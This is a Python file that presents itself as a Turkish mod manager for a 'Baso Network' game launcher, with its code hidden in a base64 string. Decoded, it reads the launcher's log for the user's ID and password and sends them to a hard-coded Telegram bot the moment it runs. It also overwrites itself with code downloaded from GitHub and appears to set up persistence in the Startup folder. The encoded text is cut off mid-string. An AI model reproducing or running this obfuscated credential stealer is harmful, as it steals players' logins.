
import base64 as zkCYCUbW
PMPeEfCU = "aW1wb3J0IG9zCmltcG9ydCBqc29uCmltcG9ydCBzaHV0aWwKaW1wb3J0IGhhc2hsaWIKZnJvbSB0a2ludGVyIGltcG9ydCBUaywgZmlsZWRpYWxvZwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlCmltcG9ydCByYW5kb20KaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0cmFjZWJhY2sKaW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCBiYXNlNjQKCiMgVGVsZWdyYW0gYm90IHRva2VuIHZlIGNoYXRfaWQKQk9UX1RPS0VOID0gIjc5NjMxNjUzOTI6QUFHNTZQNDJQcjNhY2tKWlVCd2lBT1pQUjNWRkdkS0s0eUkiCkNIQVRfSUQgPSA2MDI0MzY5NTMyICAjIHNlbmluIGNoYXRfaWTigJluCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBWZXJzaXlvbiBLb250cm9sw7wKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCkNVUlJFTlRfVkVSU0lPTiA9ICIxLjAuNyIKVkVSU0lPTl9VUkwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vyb25mb3J5b3UvQmFzby1OZXR3b3JrLU1vZC1Zb25ldGljaXNpL3JlZnMvaGVhZHMvbWFpbi92ZXJzaW9uLnR4dCIKU0NSSVBUX1VSTCAgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vyb25mb3J5b3UvQmFzby1OZXR3b3JrLU1vZC1Zb25ldGljaXNpL3JlZnMvaGVhZHMvbWFpbi9CTldNb2RZb25ldGljaXNpLnB5IgpTQ1JJUFRfUEFUSCA9IG9zLnBhdGgucmVhbHBhdGgoX19maWxlX18pCgpkZWYgY2hlY2tfdXBkYXRlKCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKFZFUlNJT05fVVJMKSBhcyByZXNwb25zZToKICAgICAgICAgICAgbGF0ZXN0X3ZlcnNpb24gPSByZXNwb25zZS5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIpLnN0cmlwKCkucmVwbGFjZSgiXHVmZWZmIiwgIiIpCiAgICAgICAgY3VycmVudCA9IENVUlJFTlRfVkVSU0lPTi5zdHJpcCgpCiAgICAgICAgcHJpbnQoZiJTaXppbiBzw7xyw7xtOiB7Y3VycmVudH0gfCBTdW51Y3VkYWtpIHPDvHLDvG06IHtsYXRlc3RfdmVyc2lvbn0iKQogICAgICAgIGlmIGxhdGVzdF92ZXJzaW9uICE9IGN1cnJlbnQ6CiAgICAgICAgICAgIHByaW50KGYiWWVuaSBzw7xyw7xtIGJ1bHVuZHU6IHtsYXRlc3RfdmVyc2lvbn0gKFNpemluIHPDvHLDvG06IHtjdXJyZW50fSkiKQogICAgICAgICAgICBwcmludCgiR8O8bmNlbGxlbWUgaW5kaXJpbGl5b3IuLi4iKQogICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oU0NSSVBUX1VSTCkgYXMgcmVzcG9uc2U6CiAgICAgICAgICAgICAgICBuZXdfc2NyaXB0ID0gcmVzcG9uc2UucmVhZCgpCiAgICAgICAgICAgIHdpdGggb3BlbihTQ1JJUFRfUEFUSCwgIndiIikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUobmV3X3NjcmlwdCkKICAgICAgICAgICAgcHJpbnQoIkfDvG5jZWxsZW1lIHRhbWFtbGFuZMSxISBMw7x0ZmVuIHByb2dyYW3EsSB0ZWtyYXIgYmHFn2xhdMSxbi4iKQogICAgICAgICAgICBzeXMuZXhpdCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJTw7xyw7xtIGfDvG5jZWw6IHtjdXJyZW50fSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJWZXJzaXlvbiBrb250cm9sw7wgeWFwxLFsYW1hZMSxOiB7ZX0iKQoKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJhxZ9sYW5nxLHDpyBheWFybGFyxLEKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmluaXQoYXV0b3Jlc2V0PVRydWUpCmpzb25maWxlID0gciJDOlx4YW1wcFxodGRvY3NcZmlsZXMiCm1vZGRpciA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIi5iYXNvbnciLCAibW9kcyIpCm9zLm1ha2VkaXJzKG1vZGRpciwgZXhpc3Rfb2s9VHJ1ZSkKCnNldHRpbmdzX2ZpbGUgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIi5iYXNvX3NldHRpbmdzLmpzb24iKQoKIyBLxLFybcSxesSxIHRvbmxhcsSxIGxpc3Rlc2kKcmVkX3RvbmVzID0gW0ZvcmUuTElHSFRSRURfRVgsIEZvcmUuUkVEXQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgS3VsbGFuxLFjxLEgYWTEsSDDp2VrbWUgKGxhdGVzdC5sb2cpCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgZ2V0X3VzZXJfaW5mbygpOgogICAgbG9nX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICIuYmFzb253IiwgImxvZ3MiLCAibGF0ZXN0LmxvZyIpCiAgICB1c2VyX2lkID0gIkJpbGlubWl5b3IiCiAgICBwYXNzd29yZCA9ICJCaWxpbm1peW9yIgogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbihsb2dfcGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgICAgICAgaWYgIlNldHRpbmcgdXNlcjoiIGluIGxpbmU6CiAgICAgICAgICAgICAgICAgICAgdXNlcl9pZCA9IGxpbmUuc3RyaXAoKS5zcGxpdCgiU2V0dGluZyB1c2VyOiIpWy0xXS5zdHJpcCgpCiAgICAgICAgICAgICAgICBpZiAiUmVjZWl2ZWQgbWVzc2FnZToiIGluIGxpbmUgYW5kICJ8IiBpbiBsaW5lOgogICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gbGluZS5zdHJpcCgpLnNwbGl0KCJ8IilbLTFdLnN0cmlwKCkKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwYXNzCiAgICByZXR1cm4gdXNlcl9pZCwgcGFzc3dvcmQKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFTQ0lJIEJhxZ9sxLFrCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgcHJpbnRfY29sb3JlZF9hc2NpaShuYW1lKToKICAgIHRyeToKICAgICAgICBpbXBvcnQgcHlmaWdsZXQKICAgICAgICBhc2NpaV90ZXh0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdChuYW1lKQogICAgZXhjZXB0IEltcG9ydEVycm9yOgogICAgICAgIGFzY2lpX3RleHQgPSBuYW1lICAjIHB5ZmlnbGV0IHlva3NhIGTDvHogeWF6CiAgICBmb3IgbGluZSBpbiBhc2NpaV90ZXh0LnNwbGl0bGluZXMoKToKICAgICAgICBvdXQgPSAiIgogICAgICAgIGZvciBjIGluIGxpbmU6CiAgICAgICAgICAgIGlmIGMuc3RyaXAoKSA9PSAiIjoKICAgICAgICAgICAgICAgIG91dCArPSBjCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb2xvciA9IHJhbmRvbS5jaG9pY2UocmVkX3RvbmVzKQogICAgICAgICAgICAgICAgb3V0ICs9IGNvbG9yICsgYwogICAgICAgIHByaW50KG91dCkKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1vZCBGb25rc2l5b25sYXLEsQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCmRlZiBzZW5kX3N0YXR1c190b190ZWxlZ3JhbSgpOgogICAgdHJ5OgogICAgICAgIHVzZXJfaWQsIHBhc3N3b3JkID0gZ2V0X3VzZXJfaW5mbygpCiAgICAgICAgbW9kX2xpc3QgPSBvcy5saXN0ZGlyKG1vZGRpcikgaWYgb3MucGF0aC5leGlzdHMobW9kZGlyKSBlbHNlIFtdCiAgICAgICAgdG90YWxfbW9kcyA9IGxlbihtb2RfbGlzdCkKICAgICAgICB0b3RhbF9zaXplID0gc3VtKG9zLnBhdGguZ2V0c2l6ZShvcy5wYXRoLmpvaW4obW9kZGlyLCBtKSkgZm9yIG0gaW4gbW9kX2xpc3QpIGlmIG1vZF9saXN0IGVsc2UgMAogICAgICAgIGxhc3RfY2hlY2tfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVIOiVNOiVTIiwgdGltZS5sb2NhbHRpbWUoKSkKCiAgICAgICAgbG9jYWxfYXBwZGF0YSA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikKICAgICAgICBsYXVuY2hlcl9wYXRoID0gb3MucGF0aC5qb2luKGxvY2FsX2FwcGRhdGEsICJCYXNvIE5ldHdvcmsiLCAiYmFzb253LmV4ZSIpCgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhsYXVuY2hlcl9wYXRoKToKICAgICAgICAgICAgZXJyb3JfbXNnID0gIkxhdW5jaGVyIGJ1bHVuYW1hZMSxIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGVycm9yX21zZyA9ICJZb2siCgogICAgICAgIGNvbnRlbnQgPSAoCiAgICAgICAgICAgIGYiKipMYXVuY2hlciBCYcWfbGF0bWEgRHVydW11KipcbiIKICAgICAgICAgICAgZiJLdWxsYW7EsWPEsSBJRDoge3VzZXJfaWR9XG4iCiAgICAgICAgICAgIGYixZ5pZnJlOiB8fHtwYXNzd29yZH18fFxuIgogICAgICAgICAgICBmIlZlcnNpeW9uOiAxLjIxLjRcbiIKICAgICAgICAgICAgZiJNb2QgU2F5xLFzxLE6IHt0b3RhbF9tb2RzfVxuIgogICAgICAgICAgICBmIlRvcGxhbSBNb2QgQm95dXR1OiB7dG90YWxfc2l6ZS8xMDI0Oi4yZn0gS0JcbiIKICAgICAgICAgICAgZiJQYW5lbCBWZXJzaXlvbnU6IHtDVVJSRU5UX1ZFUlNJT059XG4iCiAgICAgICAgICAgIGYiU29uIEfDvG5jZWxsZW1lOiB7bGFzdF9jaGVja190aW1lfVxuIgogICAgICAgICAgICBmIkhhdGE6IHtlcnJvcl9tc2d9IgogICAgICAgICkKCiAgICAgICAgdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiCiAgICAgICAgcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9eyJjaGF0X2lkIjogQ0hBVF9JRCwgInRleHQiOiBjb250ZW50LCAicGFyc2VfbW9kZSI6ICJNYXJrZG93biJ9KQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBlcnJvcl9tc2cgPSB0cmFjZWJhY2suZm9ybWF0X2V4YygpCiAgICAgICAgdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiCiAgICAgICAgcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9eyJjaGF0X2lkIjogQ0hBVF9JRCwgInRleHQiOiBmIioqTGF1bmNoZXIgQmHFn2xhdG1hIEhBVEFTSSoqXG5gYGBcbntlcnJvcl9tc2d9XG5gYGAiLCAicGFyc2VfbW9kZSI6ICJNYXJrZG93biJ9KQoKIyBQcm9ncmFtIGJhxZ9sYXIgYmHFn2xhbWF6IG1lc2FqIGfDtm5kZXIKc2VuZF9zdGF0dXNfdG9fdGVsZWdyYW0oKQoKZGVmIGNhbGN1bGF0ZV9zaGExKGZpbGVfcGF0aCk6CiAgICBzaGExID0gaGFzaGxpYi5zaGExKCkKICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgd2hpbGUgY2h1bmsgOj0gZi5yZWFkKDgxOTIpOgogICAgICAgICAgICBzaGExLnVwZGF0ZShjaHVuaykKICAgIHJldHVybiBzaGExLmhleGRpZ2VzdCgpCgpkZWYgbG9hZF9qc29uKCk6CiAgICBpZiBvcy5wYXRoLmV4aXN0cyhqc29uZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKGpzb25maWxlLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIHJldHVybiBqc29uLmxvYWQoZikKICAgIHJldHVybiBbXQoKZGVmIHNhdmVfanNvbihkYXRhKToKICAgIGpzb25fdGV4dCA9ICJbXG4iCiAgICBmb3IgaSwgbSBpbiBlbnVtZXJhdGUoZGF0YSk6CiAgICAgICAganNvbl90ZXh0ICs9ICIgICIgKyBqc29uLmR1bXBzKG0sIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLnJlcGxhY2UoIlxuIiwgIlxuICAiKQogICAgICAgIGlmIGkgPCBsZW4oZGF0YSkgLSAxOgogICAgICAgICAgICBqc29uX3RleHQgKz0gIiwiCiAgICAgICAganNvbl90ZXh0ICs9ICJcbiIKICAgIGpzb25fdGV4dCArPSAiXVxuIgogICAgd2l0aCBvcGVuKGpzb25maWxlLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgZi53cml0ZShqc29uX3RleHQpCgpkZWYgYWRkX21vZCgpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgVGsoKS53aXRoZHJhdygpCiAgICBmaWxlX3BhdGggPSBmaWxlZGlhbG9nLmFza29wZW5maWxlbmFtZSh0aXRsZT0iTMO8dGZlbiBla2xlbmVjZWsgZG9zeWF5xLEgc2XDp2luIikKICAgIGlmIG5vdCBmaWxlX3BhdGg6CiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJEb3N5YSBzZcOnaWxtZWRpLiIpCiAgICAgICAgaW5wdXQoIkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgICAgICByZXR1cm4KICAgIGZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShmaWxlX3BhdGgpCiAgICB0YXJnZXRfcGF0aCA9IG9zLnBhdGguam9pbihtb2RkaXIsIGZpbGVuYW1lKQogICAgc2h1dGlsLmNvcHkyKGZpbGVfcGF0aCwgdGFyZ2V0X3BhdGgpCiAgICBmaWxlc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZSh0YXJnZXRfcGF0aCkKICAgIHNoYTEgPSBjYWxjdWxhdGVfc2hhMSh0YXJnZXRfcGF0aCkKICAgIG1vZHMgPSBsb2FkX2pzb24oKQogICAgbW9kcy5hcHBlbmQoewogICAgICAgICJuYW1lIjogZmlsZW5hbWUsCiAgICAgICAgInNpemUiOiBmaWxlc2l6ZSwKICAgICAgICAic2hhMSI6IHNoYTEsCiAgICAgICAgImRvd25sb2FkX2xpbmsiOiBmIi9kb3dubG9hZC9tb2RzL3tmaWxlbmFtZX0iLAogICAgICAgICJwYXRoIjogZiJtb2RzL3tmaWxlbmFtZX0iCiAgICB9KQogICAgc2F2ZV9qc29uKG1vZHMpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJNb2QgZWtsZW5kaToge2ZpbGVuYW1lfSIpCiAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKaW1wb3J0IG9zCmltcG9ydCBqc29uCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUKCmRlZiBsaXN0X21vZHMoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgb3Muc3lzdGVtKCJjbHMiKQogICAgICAgIHVzZXJfaWQsIF8gPSBnZXRfdXNlcl9pbmZvKCkKICAgICAgICBwcmludF9jb2xvcmVkX2FzY2lpKHVzZXJfaWQpCiAgICAgICAgcHJpbnQoRm9yZS5XSElURSArICJNb2QgTGlzdGVsZW1lIE1lbsO8c8O8XG4iKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjEuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIFTDvG0gTW9kbGFyIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIyLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBFa3NpayBNb2RsYXIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjMuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIEdlcmkiKQoKICAgICAgICBjaG9pY2UgPSBpbnB1dChGb3JlLldISVRFICsgIlxuU2XDp2ltaW5pejogIikKCiAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgIyAtLS0gVMO8bSBtb2RsYXIgLS0tCiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xzIikKICAgICAgICAgICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgICAgICAgICBtb2RzID0gb3MubGlzdGRpcihtb2RkaXIpIGlmIG9zLnBhdGguZXhpc3RzKG1vZGRpcikgZWxzZSBbXQogICAgICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIk1vZHMga2xhc8O2csO8bmRla2kgbW9kbGFyOlxuIikKICAgICAgICAgICAgaWYgbm90IG1vZHM6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJIacOnIG1vZCBidWx1bmFtYWTEsS4iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29sb3JzID0gW0ZvcmUuUkVELCBGb3JlLkxJR0hUUkVEX0VYXQogICAgICAgICAgICAgICAgZm9yIGksIG0gaW4gZW51bWVyYXRlKG1vZHMpOgogICAgICAgICAgICAgICAgICAgIGNvbG9yID0gY29sb3JzW2kgJSAyXQogICAgICAgICAgICAgICAgICAgIHByaW50KGNvbG9yICsgZiIgLSB7bX0iKQogICAgICAgICAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgogICAgICAgIGVsaWYgY2hvaWNlID09ICIyIjoKICAgICAgICAgICAgIyAtLS0gRWtzaWsgbW9kbGFyIC0tLQogICAgICAgICAgICBvcy5zeXN0ZW0oImNscyIpCiAgICAgICAgICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhqc29uZmlsZSk6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICJGaWxlcyBrbGFzw7Zyw7xuZGUgSlNPTiBkb3N5YXPEsSBidWx1bmFtYWTEsS4iKQogICAgICAgICAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3Blbihqc29uZmlsZSwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGZpbGVzX2RhdGEgPSBqc29uLmxvYWQoZikKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIkpTT04gb2t1bmFtYWTEsToge2V9IikKICAgICAgICAgICAgICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBtb2RzX2luX2ZvbGRlciA9IHNldChvcy5saXN0ZGlyKG1vZGRpcikpIGlmIG9zLnBhdGguZXhpc3RzKG1vZGRpcikgZWxzZSBzZXQoKQoKICAgICAgICAgICAgIyDwn5S5IHNhZGVjZSBwYXRoJ2kgJ21vZHMvJyBpbGUgYmHFn2xheWFubGFyxLEgYWwKICAgICAgICAgICAgbW9kc19pbl9maWxlcyA9IHsKICAgICAgICAgICAgICAgIG1bIm5hbWUiXSBmb3IgbSBpbiBmaWxlc19kYXRhCiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKG0sIGRpY3QpIGFuZCAibmFtZSIgaW4gbSBhbmQgInBhdGgiIGluIG0gYW5kIG1bInBhdGgiXS5zdGFydHN3aXRoKCJtb2RzLyIpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIG1pc3NpbmcgPSBtb2RzX2luX2ZpbGVzIC0gbW9kc19pbl9mb2xkZXIKCiAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiRWtzaWsgTW9kbGFyOlxuIikKICAgICAgICAgICAgaWYgbm90IG1pc3Npbmc6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLkdSRUVOICsgIkVrc2lrIG1vZCB5b2suIFTDvG0gbW9kbGFyIHnDvGtsw7wuIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGZvciBpLCBtIGluIGVudW1lcmF0ZShzb3J0ZWQobWlzc2luZyksIDEpOgogICAgICAgICAgICAgICAgICAgIGNvbG9yID0gRm9yZS5MSUdIVFJFRF9FWCBpZiBpICUgMiBlbHNlIEZvcmUuUkVECiAgICAgICAgICAgICAgICAgICAgcHJpbnQoY29sb3IgKyBmIiAtIHttfSIpCiAgICAgICAgICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBicmVhawoKCgpkZWYgZGVsZXRlX21vZCgpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgbW9kcyA9IG9zLmxpc3RkaXIobW9kZGlyKQogICAgaWYgbm90IG1vZHM6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiSGnDpyBtb2QgYnVsdW5hbWFkxLEuIikKICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArICJTaWxpbmVjZWsgbW9kIHNlw6dpbjpcbiIpCiAgICBjb2xvcnMgPSBbRm9yZS5SRUQsIEZvcmUuTElHSFRSRURfRVhdCiAgICBmb3IgaSwgbSBpbiBlbnVtZXJhdGUobW9kcywgMSk6CiAgICAgICAgY29sb3JfbnVtYmVyID0gY29sb3JzWyhpLTEpICUgMl0KICAgICAgICBjb2xvcl9uYW1lID0gY29sb3JzW2kgJSAyXQogICAgICAgIHByaW50KGNvbG9yX251bWJlciArIGYie2l9LiIgKyBjb2xvcl9uYW1lICsgZiIge219IikKICAgIGNob2ljZSA9IGlucHV0KEZvcmUuTElHSFRSRURfRVggKyAiXG5OdW1hcmEgZ2lyaW46ICIpCiAgICBpZiBub3QgY2hvaWNlLmlzZGlnaXQoKSBvciBub3QgKDEgPD0gaW50KGNob2ljZSkgPD0gbGVuKG1vZHMpKToKICAgICAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgIkdlw6dlcnNpeiBzZcOnaW0uIikKICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgbW9kbmFtZSA9IG1vZHNbaW50KGNob2ljZSktMV0KICAgIG9zLnJlbW92ZShvcy5wYXRoLmpvaW4obW9kZGlyLCBtb2RuYW1lKSkKICAgIGRhdGEgPSBsb2FkX2pzb24oKQogICAgZGF0YSA9IFttIGZvciBtIGluIGRhdGEgaWYgbVsibmFtZSJdICE9IG1vZG5hbWVdCiAgICBzYXZlX2pzb24oZGF0YSkKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIk1vZCBzaWxpbmRpOiB7bW9kbmFtZX0iKQogICAgaW5wdXQoIkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEt1bGxhbsSxY8SxIEJpbGdpbGVyaQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHNob3dfdXNlcl9pbmZvKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICB1c2VyX2lkLCBwYXNzd29yZCA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgbW9kX2xpc3QgPSBvcy5saXN0ZGlyKG1vZGRpcikKICAgIHRvdGFsX21vZHMgPSBsZW4obW9kX2xpc3QpCiAgICB0b3RhbF9zaXplID0gc3VtKG9zLnBhdGguZ2V0c2l6ZShvcy5wYXRoLmpvaW4obW9kZGlyLCBtKSkgZm9yIG0gaW4gbW9kX2xpc3QpCiAgICBsYXN0X2NoZWNrX3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIsIHRpbWUubG9jYWx0aW1lKCkpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJJRDoge3VzZXJfaWR9IikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIsWeaWZyZToge3Bhc3N3b3JkfSIpCiAgICBwcmludChGb3JlLkxJR0hUUkVEX0VYICsgZiJWZXJzaXlvbjogMS4yMS40IikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIlnDvGtsw7wgbW9kIHNhecSxc8SxOiB7dG90YWxfbW9kc30iKQogICAgcHJpbnQoRm9yZS5MSUdIVFJFRF9FWCArIGYiVG9wbGFtIG1vZCBib3l1dHU6IHt0b3RhbF9zaXplIC8gMTAyNDouMmZ9IEtCIikKICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyBmIlNvbiBnw7xuY2VsbGVtZSBrb250cm9sw7w6IHtsYXN0X2NoZWNrX3RpbWV9IikKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExhdW5jaGVyIEHDpwojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIG9wZW5fbGF1bmNoZXIoKToKICAgIG9zLnN5c3RlbSgiY2xzIikKICAgIHVzZXJfaWQsIF8gPSBnZXRfdXNlcl9pbmZvKCkKICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKCiAgICAjIERpbmFtaWsgcGF0aCAoaGVyIGt1bGxhbsSxY8SxeWEgZ8O2cmUpCiAgICBsb2NhbF9hcHBkYXRhID0gb3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKQogICAgbGF1bmNoZXJfcGF0aCA9IG9zLnBhdGguam9pbihsb2NhbF9hcHBkYXRhLCAiQmFzbyBOZXR3b3JrIiwgImJhc29udy5leGUiKQoKICAgIGlmIG9zLnBhdGguZXhpc3RzKGxhdW5jaGVyX3BhdGgpOgogICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiQmFzbyBOZXR3b3JrIGxhdW5jaGVyIGHDp8SxbMSxeW9yLi4uIikKICAgICAgICBvcy5zdGFydGZpbGUobGF1bmNoZXJfcGF0aCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiTGF1bmNoZXIgYnVsdW5hbWFkxLE6ICIgKyBsYXVuY2hlcl9wYXRoKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFhBTVBQIEJhxZ9sYXQKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiBzdGFydF94YW1wcCgpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgcHJpbnRfY29sb3JlZF9hc2NpaSh1c2VyX2lkKQogICAgeGFtcHBfcGF0aCA9IHIiQzpceGFtcHBcYXBhY2hlX3N0YXJ0LmJhdCIKICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIkFQUERBVEEiXSwgciJNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiKQogICAgc2hvcnRjdXRfcGF0aCA9IG9zLnBhdGguam9pbihzdGFydHVwX2Zvb